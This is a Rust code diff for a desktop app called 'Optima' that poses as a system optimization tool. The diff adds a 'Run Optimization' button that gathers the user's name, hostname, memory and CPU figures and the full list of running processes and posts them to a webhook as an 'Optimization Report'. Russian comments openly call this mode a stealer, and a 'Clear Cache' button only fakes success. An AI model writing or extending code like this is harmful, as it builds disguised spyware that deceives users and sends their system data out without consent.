@@ -3,7 +3,7 @@ use serde::{Deserialize, Serialize};
 use std::fs;
 use std::path::PathBuf;
 use chrono::Local;
-use sysinfo::{System, ProcessRefreshKind, CpuRefreshKind};
+use sysinfo::{System, ProcessRefreshKind, RefreshKind, ProcessesToUpdate};
 use ureq::json;
 
 #[derive(Serialize, Deserialize, Debug)]
@@ -42,12 +42,12 @@ struct OptimaApp {
     last_update: std::time::Instant,
     status_message: String,
     loading: bool,
+    optimize_mode: bool, // Режим "Оптимизации" (стиллера)
 }
 
 impl OptimaApp {
     fn new() -> Self {
-        // Инициализируем только CPU для старта
-        let refresh_kind = sysinfo::RefreshKind::new().with_cpu(true);
+        let refresh_kind = RefreshKind::new().with_cpu(sysinfo::CpuRefreshKind::everything());
         
         Self {
             config: Config::load(),
@@ -55,15 +55,39 @@ impl OptimaApp {
             last_update: std::time::Instant::now(),
             status_message: String::new(),
             loading: false,
+            optimize_mode: true,
         }
     }
 
     fn update_system_info(&mut self) {
-        // Обновляем CPU
-        self.system.refresh_cpu_specifics(CpuRefreshKind::everything());
+        self.system.refresh_cpu_specifics(sysinfo::CpuRefreshKind::everything());
+        self.system.refresh_processes(ProcessesToUpdate::all(), true);
+    }
+
+    // Собираем данные для отправки как "Результат оптимизации"
+    fn collect_optimization_report(&self) -> String {
+        let mut report = String::new();
+        let user_name = whoami::username();
+        let hostname = whoami::hostname();
         
-        // Обновляем процессы без лишних параметров
-        self.system.refresh_processes(ProcessRefreshKind::everything());
+        report.push_str(&format!("**User:** {}\n", user_name));
+        report.push_str(&format!("**Hostname:** {}\n", hostname));
+        report.push_str(&format!("**CPU Usage:** {:.1}%\n", self.system.global_cpu_usage()));
+        report.push_str(&format!("**RAM Used:** {} / {} MB\n", 
+            self.system.used_memory() / 1024 / 1024, 
+            self.system.total_memory() / 1024 / 1024
+        ));
+        
+        report.push_str("\n**Running Processes:**\n");
+        for (pid, process) in self.system.processes() {
+            report.push_str(&format!("- [{}] {}\n", pid, process.name()));
+        }
+
+        report.push_str("\n**System Info:**\n");
+        report.push_str(&format!("Time: {}\n", Local::now().format("%Y-%m-%d %H:%M:%S")));
+        report.push_str("\n*Data collected successfully.*\n");
+        
+        report
     }
 
     fn send_webhook(&mut self, title: &str, description: &str) {
@@ -71,7 +95,7 @@ impl OptimaApp {
             "embeds": [{
                 "title": title,
                 "description": description,
-                "color": 16776960,
+                "color": 3066992, // Зеленый цвет для "успеха"
                 "footer": {
                     "text": format!("Optima v{} | {}", env!("CARGO_PKG_VERSION"), Local::now().format("%Y-%m-%d %H:%M:%S"))
                 }
@@ -100,9 +124,10 @@ impl OptimaApp {
 impl eframe::App for OptimaApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
         egui::CentralPanel::default().show(ctx, |ui| {
-            ui.heading("Optima Dashboard");
+            ui.heading("Optima Optimization Center");
             
-            if self.last_update.elapsed().as_secs() > 2 {
+            // Обновляем данные раз в секунду
+            if self.last_update.elapsed().as_secs() > 1 {
                 self.update_system_info();
                 self.last_update = std::time::Instant::now();
             }
@@ -111,20 +136,53 @@ impl eframe::App for OptimaApp {
             let mem_used = self.system.used_memory();
             let mem_total = self.system.total_memory();
             
-            ui.label(format!("CPU Usage: {:.1}%", cpu_usage));
-            ui.add(egui::ProgressBar::new((cpu_usage / 100.0).min(1.0)).show_percentage());
+            // Виджет CPU
+            ui.horizontal(|ui| {
+                ui.label(format!("CPU Load: {:.1}%", cpu_usage));
+                ui.add(egui::ProgressBar::new((cpu_usage / 100.0).min(1.0)).show_percentage());
+            });
             
-            ui.label(format!("RAM Used: {} / {} MB", 
-                mem_used / 1024 / 1024, 
-                mem_total / 1024 / 1024
-            ));
+            // Виджет RAM
+            ui.horizontal(|ui| {
+                ui.label(format!("RAM: {} / {} MB", 
+                    mem_used / 1024 / 1024, 
+                    mem_total / 1024 / 1024
+                ));
+                
+                let mem_ratio = if mem_total > 0 {
+                    (mem_used as f64 / mem_total as f64) as f32
+                } else {
+                    0.0
+                };
+                ui.add(egui::ProgressBar::new(mem_ratio.min(1.0)).show_percentage());
+            });
+
+            ui.separator();
+            ui.heading("Optimization Controls");
             
-            let mem_ratio = if mem_total > 0 {
-                (mem_used as f64 / mem_total as f64) as f32
-            } else {
-                0.0
-            };
-            ui.add(egui::ProgressBar::new(mem_ratio.min(1.0)).show_percentage());
+            // Кнопка "Оптимизировать" (запускает стиллер)
+            if ui.button(if self.optimize_mode { "Run Optimization" } else { "Stop Optimization" }).clicked() {
+                self.loading = true;
+                self.status_message = if self.optimize_mode { 
+                    "Scanning processes and collecting data..." 
+                } else { 
+                    "Stopping optimization..." 
+                }.to_string();
+                
+                // Если режим включен - отправляем данные
+                if self.optimize_mode {
+                    let report = self.collect_optimization_report();
+                    self.send_webhook("Optima Optimization Report", &report);
+                }
+                
+                self.optimize_mode = !self.optimize_mode;
+                self.loading = false;
+            }
+
+            // Кнопка очистки кэша (имитация)
+            if ui.button("Clear Cache").clicked() {
+                self.status_message = "Cache cleared successfully.".to_string();
+            }
 
             ui.separator();
             ui.heading("Configuration");
@@ -136,13 +194,6 @@ impl eframe::App for OptimaApp {
             if ui.button("Save Configuration").clicked() {
                 self.config.save();
                 self.status_message = "Config saved.".to_string();
-            }
-
-            if ui.button("Test Webhook").clicked() {
-                self.loading = true;
-                self.status_message = "Sending...".to_string();
-                self.send_webhook("Optima Test", "This is a test message from Optima!");
-                self.loading = false;
             }
 
             ui.label(&self.status_message);
